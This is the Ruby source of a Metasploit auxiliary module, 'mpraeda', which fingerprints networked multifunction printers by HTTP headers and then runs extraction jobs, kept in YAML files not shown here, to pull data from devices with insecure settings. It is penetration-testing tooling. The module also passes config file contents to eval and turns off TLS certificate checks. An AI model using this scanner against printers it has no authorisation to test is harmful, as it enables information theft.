##
# $Id: mpraeda.rb 0.01a mshirley $
##

require 'msf/core'
require 'yaml'
require 'net/http'
require 'net/https'

class Metasploit3 < Msf::Auxiliary

        include Msf::Auxiliary::Scanner
        include Msf::Auxiliary::Report
#	include Msf::Exploit::Remote::HttpClient

    def initialize
        super(
            'Name'           => 'mpraeda -- Remote Printer Exploitation Module',
            'Description'    => %q{
                   This module is a port of the praeda tool to remotely exploit common MFP devices with insecure settings leading to information disclosure. 
            },
            'License'        => MSF_LICENSE,
            'Author'      =>
                [
                    'Foofus.net Deral Heiland aka percX',    #original exploit
                    'mshirley',    #metasploit module
                ],
            'Version'        => '$Revision: 0.01a $',
            'References'     =>
                [
                    [ 'URL', 'http://www.foofus.net/?page_id=218' ],
                ])
	register_options(
		[
			OptString.new('YAML_INV_CONFIG', [true, "Full path to YAML Inventory Config file", File.join(Msf::Config.install_root, "data","inventory.yaml")]),
			OptString.new('YAML_JOB_CONFIG', [true, "Full path to YAML Job Config File", File.join(Msf::Config.install_root, "data", "jobs.yaml")]),
			OptString.new('SCHEME', [ true, "Scheme to use, select http or https", "http"])
		], self.class)
    end


	def map_yaml(db, label)
		list = []
		for i in 0...db.length
			list << db[i].map { |v| v[label].strip }
		end
		return(list)
	end

	def fetch(scheme, host, port, path)
		if port.nil?
			port = 80
		end

		print_status("connecting: #{scheme}://#{host}:#{port}#{path}")
		url = scheme + "://" + host + ":#{port}" + path
		url = URI.parse(url)
		http = Net::HTTP.new(url.host, url.port)
		http.read_timeout = 500
		if scheme == "https"
			http.use_ssl = true
			http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		end

		begin
			result = Timeout::timeout(10) { http.request(Net::HTTP::Get.new(url.request_uri)) }
		rescue Timeout::Error
			result = "ERROR: Fetch timeout"
		rescue Errno::ECONNREFUSED
			result = "ERROR: Connection refused"
		else
		end

	return result
	#
	# future
	# 

	# user auth
	# request.basic_auth("username", "password")

	# form post
	# request = Net::HTTP::Post.new(url.request_uri)
	# request.set_form_data({"q" => "query", "variable" => "value"})
	# result = http.request(request)

	end

	def run_host(targethost) 

		fileconf = File.open(datastore['YAML_INV_CONFIG'], "rb")
		yamlconf = YAML::load(fileconf)
        
		idlist = map_yaml(yamlconf, "id").flatten
		namelist = map_yaml(yamlconf, "name").flatten
		versionlist = map_yaml(yamlconf, "version").flatten
		joblist = map_yaml(yamlconf, "jobs").flatten
		jobs = ""

		response = fetch(datastore['SCHEME'], targethost, datastore['RPORT'], "/") 
		if !response.respond_to?("body")
			print_status("#{response}")
		end
		versionlist.each_with_index.select { |version,i|
                	if response['Server'] == version and response['Title'] == namelist[i]
				print_status("#{targethost} matches #{version}")
				jobs << joblist[i]
			end
		}.map(&:last)
		jobarray = jobs.split(",").uniq
		jobfileconf = File.open(datastore['YAML_JOB_CONFIG'], "rb")
		jobyamlconf = YAML::load(jobfileconf)
		
		jobarray.each { |job|
			print_status("execting job #{job}")
			eval(jobyamlconf[job].to_s)
		}

	end

end

